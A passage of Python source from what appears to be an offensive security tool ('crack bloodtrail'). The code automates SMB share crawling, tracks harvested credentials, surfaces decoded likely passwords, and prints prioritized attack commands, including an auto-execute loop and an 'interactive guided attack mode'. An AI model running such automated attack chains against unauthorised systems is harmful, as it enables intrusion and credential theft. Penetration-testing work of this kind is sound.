                            "username": "guest",
                            "password": "",
                            "shares": guest_shares,
                        },
                    )
                    orchestrator.engine.add_finding(guest_finding)

                    # Create SMB crawl recommendation
                    crawl_rec = create_smb_crawl_recommendation(
                        finding=guest_finding,
                        target=target,
                        username="guest",
                        password="",
                        domain=domain or aggregated.domain,
                    )
                    orchestrator.engine.state.pending_recommendations.append(crawl_rec)
                    print(f"  {G}[+]{X} SMB crawl recommendation queued for {len(guest_shares)} shares")

            # Also add credentials from command line (-u/-p)
            if username and password:
                orchestrator.engine.add_credential(
                    username=username,
                    password=password,
                    validated=True,
                    access_level="user",
                )

            # Run auto-execute loop
            print()
            print(f"{C}{B}{'=' * 74}{X}")
            print(f"{C}{B}  AUTO-EXECUTE MODE{X}")
            print(f"{C}{B}{'=' * 74}{X}")
            print()

            final_state = orchestrator.run()

            # Show final status
            print()
            print(f"{C}{B}{'=' * 74}{X}")
            print(f"{C}{B}  AUTO-EXECUTE COMPLETE{X}")
            print(f"{C}{B}{'=' * 74}{X}")
            print()
            print(f"  {D}Status:{X}      {B}{final_state.status.value}{X}")
            print(f"  {D}Depth:{X}       {B}{final_state.current_depth}{X}")
            print(f"  {D}Credentials:{X} {B}{len(final_state.validated_credentials)}{X}")
            print(f"  {D}Completed:{X}   {B}{len(final_state.completed_recommendations)}{X}")
            print()

            # If paused for manual step, show resume instructions
            from ...auto import ExecutionStatus
            if final_state.status == ExecutionStatus.PAUSED_MANUAL:
                print(f"  {Y}Paused for manual step. After completing, resume with:{X}")
                print(f"  {G}$ crack bloodtrail {target} --auto --cred USER:PASS{X}")
                print()
            elif final_state.status == ExecutionStatus.PAUSED_SHELL:
                print(f"  {Y}Paused before shell access. Review the command and run manually.{X}")
                print()

            return  # Skip normal recommendation display in auto mode

        # Check if we have any recommendations
        if not engine.state.pending_recommendations:
            return  # No special findings to highlight

        # Show prioritized findings section
        print()
        print(f"{C}{B}{'=' * 74}{X}")
        print(f"{C}{B}  PRIORITIZED FINDINGS (Recommendation Engine){X}")
        print(f"{C}{B}{'=' * 74}{X}")
        print()

        # Group recommendations by priority
        critical = [r for r in engine.state.pending_recommendations
                   if r.priority == RecommendationPriority.CRITICAL]
        high = [r for r in engine.state.pending_recommendations
               if r.priority == RecommendationPriority.HIGH]
        medium = [r for r in engine.state.pending_recommendations
                 if r.priority == RecommendationPriority.MEDIUM]

        # Show findings with decoded values
        decoded_findings = [f for f in engine.state.findings.values()
                          if f.decoded_value]
        if decoded_findings:
            print(f"  {B}AUTO-DECODED VALUES{X}")
            print(f"  {D}{'─' * 60}{X}")
            for finding in decoded_findings[:5]:
                username_ctx = finding.metadata.get("username", "")
                attr = finding.target
                print(f"    {B}{username_ctx}{X}.{C}{attr}{X}")
                print(f"      Raw:     {D}{finding.raw_value}{X}")
                print(f"      Decoded: {G}{finding.decoded_value}{X} {D}({finding.decode_method}){X}")
                if "likely_password" in finding.tags:
                    print(f"      {Y}⚠ Likely password{X}")
                print()
            if len(decoded_findings) > 5:
                print(f"    {D}... and {len(decoded_findings) - 5} more{X}")
                print()

        # Critical recommendations
        if critical:
            print(f"  {R}{B}CRITICAL ACTIONS ({len(critical)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            for rec in critical[:3]:
                print(f"    {R}●{X} {rec.description}")
                if rec.command:
                    print(f"      {G}$ {rec.command}{X}")
                if rec.why:
                    print(f"      {D}Why: {rec.why[:60]}...{X}" if len(rec.why) > 60 else f"      {D}Why: {rec.why}{X}")
                print()
            if len(critical) > 3:
                print(f"    {D}... and {len(critical) - 3} more critical{X}")
                print()

        # High priority recommendations
        if high:
            print(f"  {Y}{B}HIGH PRIORITY ({len(high)}){X}")
            print(f"  {D}{'─' * 60}{X}")
            for rec in high[:3]:
                print(f"    {Y}●{X} {rec.description}")
                if rec.command:
                    print(f"      {G}$ {rec.command}{X}")
            if len(high) > 3:
                print(f"    {D}... and {len(high) - 3} more{X}")
            print()

        # Medium priority summary
        if medium:
            print(f"  {D}MEDIUM PRIORITY: {len(medium)} additional recommendations{X}")
            print()

        # Show SMB crawl next steps when credentials are available
        if username and password:
            from ...recommendation import generate_smb_crawl_command

            print(f"  {B}NEXT STEPS WITH CREDENTIALS{X}")
            print(f"  {D}{'─' * 60}{X}")
            print(f"  {D}# Enumerate SMB shares:{X}")
            smb_cmd = generate_smb_crawl_command(target, username, password, domain)
            print(f"  {G}$ {smb_cmd}{X}")
            print()
            print(f"  {D}# Deep crawl with BloodTrail (auto-detects VNC, SQLite, etc):{X}")
            crawl_opt = f"-u {username} -p '{password}'"
            domain_opt = f"--domain {domain}" if domain else ""
            print(f"  {G}$ crack bloodtrail {target} {crawl_opt} {domain_opt} --crawl-smb{X}".strip())
            print()

        # Interactive mode prompt
        if interactive:
            from ...interactive import InteractiveSession

            print(f"  {C}Starting interactive session...{X}")
            print(f"  {D}Press Ctrl+C to exit, '?' for help{X}")
            print()

            session = InteractiveSession(engine, verbose=True)
            session.start()

            try:
                session.run_recommendation_loop()
            except KeyboardInterrupt:
                print("\n  Exiting interactive mode...")
        else:
            # Hint about interactive mode
            total = len(critical) + len(high) + len(medium)
            if total > 0:
                print(f"  {D}Tip: Use -i for interactive guided attack mode{X}")
                print()
